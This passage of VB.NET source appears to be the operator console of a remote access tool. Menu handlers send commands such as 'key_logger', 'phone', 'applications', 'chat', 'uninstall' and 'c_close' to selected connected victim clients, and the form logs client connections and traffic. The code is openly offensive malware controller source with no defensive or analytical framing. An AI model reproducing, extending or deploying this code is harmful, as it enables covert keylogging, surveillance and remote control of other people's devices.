                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "phone")
            Next
        End If
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "key_logger" + s.SplitData)
            Next
        End If
    End Sub

    Private Sub ApplicationsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ApplicationsToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "applications")
            Next
        End If
    End Sub
    Private Sub BandwidthPerSec(source As Object, e As Timers.ElapsedEventArgs)
        Try
            If s.TcpState Then

                Static LastUpload As Long = s.BytesSent
                Static LastDownload As Long = s.BytesReceived
                Dim Up = s.BytesSent - LastUpload
                Dim Down = s.BytesReceived - LastDownload
                Dim upReceived As String = String.Format("[Upload] ({0})", store_0.BytesConverter(If(Up < 0, 0, Up)))

                Dim DownReceived As String = String.Format("[Download] ({0})", store_0.BytesConverter(If(Down < 0, 0, Down)))
                Dim FinalString = upReceived + Space(1) + DownReceived

                If FinalString.Contains(" MB") Or DownReceived.Contains(" GB") Or DownReceived.Contains(" TB") Then
                    If Label1.ForeColor = Color.FromArgb(245, 248, 250) Then
                        Label1.ForeColor = Color.PapayaWhip
                    End If
                Else
                    If Label1.ForeColor = Color.PapayaWhip Then
                        Label1.ForeColor = Color.FromArgb(245, 248, 250)
                    End If
                End If
                Label1.Text = FinalString
                LastUpload = s.BytesSent
                LastDownload = s.BytesReceived
            Else

                Dim upReceived As String = String.Format("[Upload] ({0})", store_0.BytesConverter(0))
                Dim DownReceived As String = String.Format("[Download] ({0})", store_0.BytesConverter(0))
                Label1.Text = upReceived + Space(1) + DownReceived
            End If
        Catch ex As Exception
        End Try
    End Sub
    Delegate Sub lgs(ByVal Number_Client As Integer, ByVal Data_0 As String, ByVal error_0 As String)

    Private Sub CleanToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanToolStripMenuItem.Click
        UserControl1.DataLogs.Rows.Clear()
    End Sub
    Sub lg(ByVal Number_Client As Integer, ByVal Data_0 As String, ByVal error_0 As String) Handles s.log_S
        Try
            If Me.InvokeRequired Then
                Dim inv As New lgs(AddressOf lg)
                Me.Invoke(inv, New Object() {Number_Client, Data_0, error_0})
                Exit Sub
            Else

                Dim GRA$ = s.getRemote_Address(Number_Client, 1)
                Dim tm$ = "[" + TimeOfDay.ToString("h:mm:ss") + "]"
                If Not GRA = "0.0.0.0:0" Then

                    Select Case Data_0
                        Case "Connected"
                            UserControl1.DataLogs.Rows.Add(GRA, Data_0, tm, error_0)
                            UserControl1.DataLogs.Rows(UserControl1.DataLogs.Rows.Count - 1).Cells(2).Style.ForeColor = Color.SeaGreen
                            ToEnd()
                        Case "DisConnected"
                            UserControl1.DataLogs.Rows.Add(GRA, Data_0, tm, error_0)
                            UserControl1.DataLogs.Rows(UserControl1.DataLogs.Rows.Count - 1).Cells(2).Style.ForeColor = Color.Crimson
                            ToEnd()
                    End Select
                Else
                    Select Case Data_0
                        Case "Listener"
                            If Not error_0 = Nothing Then
                                UserControl1.DataLogs.Rows.Add(GRA, Data_0, tm, error_0)
                                UserControl1.DataLogs.Rows(UserControl1.DataLogs.Rows.Count - 1).Cells(2).Style.ForeColor = Color.FromArgb(66, 66, 55)
                                ToEnd()
                            End If
                        Case "DisConnected"
                            If Not error_0 = Nothing And Number_Client = -1 Then
                                UserControl1.DataLogs.Rows.Add(GRA, Data_0, tm, error_0)
                                UserControl1.DataLogs.Rows(UserControl1.DataLogs.Rows.Count - 1).Cells(2).Style.ForeColor = Color.RoyalBlue
                                ToEnd()
                            End If
                    End Select

                End If
                If UserControl1.DataLogs.Rows.Count > 150 Then
                    UserControl1.DataLogs.Rows.RemoveAt(0)
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ToEnd()
        UserControl1.DataLogs.FirstDisplayedScrollingRowIndex = UserControl1.DataLogs.RowCount - 1
        UserControl1.DataLogs.CurrentCell = Nothing
        UserControl1.DataLogs.Rows(UserControl1.DataLogs.RowCount - 1).Selected = True
    End Sub
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        '
        If ToolStripMenuItem2.Tag = "on" Then
            UserControl1.Visible = False
            ToolStripMenuItem2.Text = "Logs"
            ToolStripMenuItem2.Tag = "off"
        Else
            UserControl1.Dock = System.Windows.Forms.DockStyle.Fill
            UserControl1.Visible = True
            ToolStripMenuItem2.Tag = "on"
            ToolStripMenuItem2.Text = "View"
        End If
    End Sub
    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChatToolStripMenuItem.Click
        Dim MyName As String = Nothing
        MyName = InputBox("Enter your name", store_0.name_prog, "support")
        If String.IsNullOrEmpty(MyName) Then
            GoTo nx
        Else
            If DataGridView1.SelectedRows.Count > 0 Then
                For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                    s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "chat" + s.SplitData + MyName)
                Next
            End If
        End If
nx:
    End Sub

    Private Sub DataGridView1_CellMouseClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        Try
            If s.TcpState Then

                If DataGridView1.SelectedRows.Count > 0 Then
                    If Not e.RowIndex = -1 Then
                        DataGridView1.Rows(e.RowIndex).Cells(8).Value = "Please Wait..."
                        s.Send(DataGridView1.Rows(e.RowIndex).Cells(2).Tag, "re_updating" + s.SplitData)

                    End If
                End If
            End If

        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Try
            If s.TcpState Then
                If DataGridView1.SelectedRows.Count = 1 Then
                    For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                        s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "re_updating" + s.SplitData)
                    Next
                End If
            End If

        Catch ex As Exception
        End Try

    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Disconnect(CInt(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag), "Restart")
            Next
        End If
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "c_close")
                s.Disconnect(CInt(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag), "Close")
            Next
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "uninstall" + s.SplitData + "-1")
            Next
        End If
    End Sub

    Private Sub DataGridView1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs) Handles DataGridView1.ColumnWidthChanged
        Dim col As DataGridViewColumn = e.Column
        Dim c As DataGridViewColumn = DataGridView1.Columns(0)
        If c.Width > 196 Then
            e.Column.Width = 196

        End If
        Me.Refresh()
        Panel2.Refresh()

    End Sub
    Public Sub PKeyDown(eI As Boolean)
        Try
            If Not Panel2.Visible = eI Then
                Panel2.Visible = eI
            End If

        Catch ex As Exception
        End Try
    End Sub



    Private Sub DataGridView1_KeyDown(sender As Object, e As KeyEventArgs) Handles DataGridView1.KeyDown
        If e.KeyCode = Keys.H Then
            PKeyDown(False)
        ElseIf e.KeyCode = Keys.S Then
            PKeyDown(True)
        End If
    End Sub
End Class
